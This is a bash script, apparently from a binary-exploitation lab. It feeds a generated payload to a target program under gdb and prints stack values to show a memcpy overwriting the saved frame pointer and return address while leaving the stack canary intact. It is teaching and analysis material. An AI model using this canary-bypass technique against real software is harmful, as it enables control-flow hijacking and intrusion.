#!/usr/bin/env bash
# Scene 4: dark-log -- input's canary is untouched while memcpy changes control.
source "$(dirname -- "${BASH_SOURCE[0]}")/common.sh"
attacklab_prepare
python3 payload_canary.py > "$ATTACKLAB_FIXTURE_DIR/canary.bin"
gdb -q -nx -batch "$ATTACKLAB_WORKDIR/dark-log" \
  -ex 'set pagination off' \
  -ex 'set disable-randomization off' \
  -ex 'break *input' \
  -ex "run < $ATTACKLAB_FIXTURE_DIR/canary.bin" \
  -ex 'nexti' -ex 'nexti' -ex 'nexti' -ex 'nexti' -ex 'nexti' \
  -ex 'printf "after prologue: rbp=%#lx rsp=%#lx\n", $rbp, $rsp' \
  -ex 'printf "stack canary at rbp-0x8 : "' \
  -ex 'p/x *(unsigned long *)($rbp - 0x8)' \
  -ex 'printf "TLS canary at fs:0x28   : "' \
  -ex 'p/x *(unsigned long *)($fs_base + 0x28)' \
  -ex 'break *input+0x105' \
  -ex 'continue' \
  -ex 'printf "len (rbp-0x20) = %d (0x%x)\n", *(int *)($rbp - 0x20), *(int *)($rbp - 0x20)' \
  -ex 'printf "memcpy destination = logMsg + len = %#lx\n", $rbp - 0xa0 + *(int *)($rbp - 0x20)' \
  -ex 'printf "stack canary at rbp-0x8 : "' \
  -ex 'p/x *(unsigned long *)($rbp - 0x8)' \
  -ex 'printf "overwritten saved rbp / return address:\n"' \
  -ex 'x/5gx $rbp - 0x8' 2>&1 | sed -n '1,36p'
